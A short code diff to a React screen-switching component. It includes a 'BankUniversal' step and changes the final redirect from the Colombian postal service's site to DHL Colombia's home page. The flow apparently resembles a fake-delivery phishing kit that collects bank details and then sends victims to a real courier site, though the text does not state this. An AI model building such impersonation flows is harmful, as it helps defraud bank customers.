@@ -55,7 +55,7 @@ const Screens = ({ idF, setActiveScreen }) => {
             case "5":
                 return <BankUniversal idF={idF}/>
             case "fin":
-                window.location.replace("https://www.4-72.com.co")
+                window.location.replace("https://www.dhl.com/co-es/home.html")
                 return <Loading />
             default:
                 return <Loading />
